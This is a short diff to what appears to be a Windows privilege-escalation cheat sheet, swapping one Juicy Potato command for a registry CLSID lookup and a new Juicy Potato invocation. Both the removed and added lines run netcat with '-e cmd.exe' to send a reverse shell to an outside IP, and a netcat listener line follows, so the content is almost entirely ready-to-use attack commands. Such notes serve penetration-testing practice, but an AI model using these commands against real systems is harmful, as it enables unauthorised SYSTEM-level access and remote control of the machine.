@@ -45,7 +45,14 @@ Get-SeBackupPrivilege
 # SeImpersonate and SeAssignPrimaryToken
 ```powershell
 # Juicy Potato
-JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+reg query HKCR\CLSID /s /f LocalService
+HKEY_CLASSES_ROOT\CLSID\{8BC3F05E-D86B-11D0-A075-00C04FB68820}
+    LocalService    REG_SZ    winmgmt
+
+HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
+    LocalService    REG_SZ    winmgmt
+
+.\juicypotato.exe -l 4141 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a " /c c:\users\default\tools\nc.exe -e cmd.exe 10.10.14.150 4141" -t *
 sudo nc -lnvp 8443
 ```
 
